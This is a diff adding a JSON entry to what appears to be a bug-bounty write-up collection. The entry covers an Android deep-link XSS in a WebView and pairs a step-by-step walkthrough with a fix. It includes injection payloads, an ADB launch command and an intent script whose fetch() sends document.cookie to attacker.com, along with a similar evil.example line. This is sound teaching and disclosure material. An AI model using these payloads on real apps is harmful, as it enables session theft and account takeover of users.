@@ -1,5 +1,45 @@
 [
   {
+    "id": "bfbea9abab5f",
+    "title": "One-Click Cookie Theft via Deep Link XSS (But Deep Links Are Out of Scope)",
+    "url": "https://abdelnasserr.medium.com/one-click-cookie-theft-via-deep-link-xss-but-deep-links-are-out-of-scope-b9cb1b43dacb",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "abdelnasser"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-03T15:35:22.000Z",
+    "added_at": "2026-11-04T17:40:29.184Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "An Android app injects a deep‑link path segment directly into a JavaScript string inside a WebView, enabling XSS that steals the user’s session cookie in one click.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The app receives a deep‑link URL, extracts the last path segment (called itemId) and concatenates it into a JavaScript string that is later rendered by WebView.loadDataWithBaseURL(). No sanitisation or escaping is performed, so a crafted path segment can break out of the surrounding single‑quote and inject arbitrary JavaScript. Because the WebView is loaded with the company’s main domain as the base URL, the injected script runs in the same origin as the legitimate site. The session cookie is a JWT that lacks the httpOnly flag, meaning JavaScript can read it via document.cookie. Combining an unsanitised injection point with a readable cookie creates a classic cross‑site scripting (XSS) that leads to full session theft.",
+      "walkthrough": "RECON\nStep 1: Identify that the app handles deep links and forwards the last path segment to a WebView. Why: A deep link is a special URL that opens the app; the last segment is the variable part the attacker can control.\n\nDISCOVERY\nStep 2: Decompile the ContentFragment class and locate the code:\nString itemId = extractLastPathSegment(deepLinkUrl);\nwebView.loadDataWithBaseURL(CONTENT_BASE_URL,\n \"<script>\" +\n \"window.__config = { itemId: '\" + itemId + \"' };\" +\n \"</script>\",\n null, null, null);\nWhy: The code shows itemId is inserted inside single quotes without any escaping.\nStep 3: Verify that the session cookie is not httpOnly by inspecting the app’s network traffic or Android’s cookie store. Why: httpOnly would prevent JavaScript from reading the cookie.\n\nEXPLOITATION\nStep 4: Craft a malicious path segment that closes the surrounding quote and injects JavaScript. Example payload: ~x'+alert(1337)+'\nWhy: The leading single quote ends the string, then alert(1337) runs, and the trailing single quote re‑opens the string.\nStep 5: Test the payload via ADB (Android Debug Bridge) to launch the deep link:\nam start -a android.intent.action.VIEW \\\n -d \"https://redacted.com/content-page/~x'+alert(1337)+'\"\nWhy: ADB sends an intent to the app with the crafted URL; the WebView renders the injected script, proving XSS.\nStep 6: Build a one‑click steal payload that sends document.cookie to an attacker server:\n<script>\n window.location = \"intent://redacted.com/content-page/\" \n + \"~x'+fetch('https://attacker.com/collect?c='+document.cookie)+'\" \n + \"#Intent;scheme=https;package=com.redacted.app;end\";\n</script>\nWhy: The script creates an intent URL that, when opened in a browser, redirects the victim into the app with the XSS payload; fetch() makes an HTTP request to attacker.com containing the cookie.\n\nIMPACT\nStep 7: When the victim clicks the malicious link, the app loads the payload in a WebView under the redacted.com origin, document.cookie reads the JWT, and fetch() exfiltrates it.\nWhy: Because the cookie is readable, the attacker now possesses the user’s email, account ID, and session ID, enabling full account takeover with a single click.",
+      "example": "Assume a fictional app at target.example loads articles via a WebView. The code is:\nString articleId = getLastPathSegment(uri);\nwebView.loadDataWithBaseURL(\"https://target.example\", \"<script>var cfg={id:'\"+articleId+\"'};</script>\", null, null, null);\nBecause articleId is placed inside single quotes without escaping, an attacker can use the path segment:\n~test'+fetch('https://evil.example/steal?c='+document.cookie)+'\nThe full deep‑link URL becomes:\nhttps://target.example/article/~test'+fetch('https://evil.example/steal?c='+document.cookie)+'\nWhen the app opens this link, the WebView executes the fetch() call and sends the session cookie to evil.example. The vulnerability is the same: unsanitised concatenation of user‑controlled data into a JavaScript string.",
+      "takeaway": "When hunting Android apps, look for any place where a deep‑link parameter is inserted into HTML/JavaScript without encoding – especially inside loadDataWithBaseURL or loadData. Tools like jadx or apktool can reveal such string concatenations. Remember that a readable session cookie (no httpOnly) turns a simple XSS into full account takeover. Variants include injecting into JSON objects, CSS, or URL fragments that later become script. A common beginner mistake is to think that because the payload runs inside a WebView it is harmless; the same‑origin rule still applies, so any cookie accessible to JavaScript is at risk.",
+      "fix": "Sanitise or encode the deep‑link segment before embedding it in JavaScript. For example, use Android’s TextUtils.htmlEncode() or a proper JSON encoder and wrap the value in double quotes:\nString safeId = JSONObject.quote(itemId); // adds escaping\nwebView.loadDataWithBaseURL(CONTENT_BASE_URL,\n \"<script>window.__config = { itemId: \"+safeId+\" };</script>\",\n null, null, null);\nAdditionally, set the session cookie with the httpOnly flag on the server so JavaScript cannot read it (Set‑Cookie: session=...; HttpOnly; Secure; SameSite=Strict). This removes the ability for any XSS to exfiltrate the cookie.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "**بِسْمِ اَللَّهِ وَالْحَمْدِ لِلَّهِ الَّذِي عَلَّمَ بِالْقَلَمِ عَلَّمَ الْإِنْسَانَ مَا لَمْ يَعْلَمْ وَالصَّلَاةَ وَالسَّلَامَ عَلَى خَيْرِ مُعَلِّمِي اَلنَّاسِ اَلْخَيْرِ مُحَمَّدْ وَبَعْدٍ** ## Description I was looking at the deep link handling in two Android news apps from a major European media conglomerate. The apps have a specific content page that loads data in a WebView via `loadDataWithBaseURL()`. The last path segment of the deep link URL is extracted and concatenated directly into a JavaScript string with zero sanitization. Since the base URL is the company’s main domain, the i",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "9583769e3adf",
     "title": "Cache Me If You Can: XSS in Cloudflare's /cdn-cgi/image/",
     "url": "https://www.reddit.com/r/netsec/comments/1xhqdx6/cache_me_if_you_can_xss_in_cloudflares_cdncgiimage",
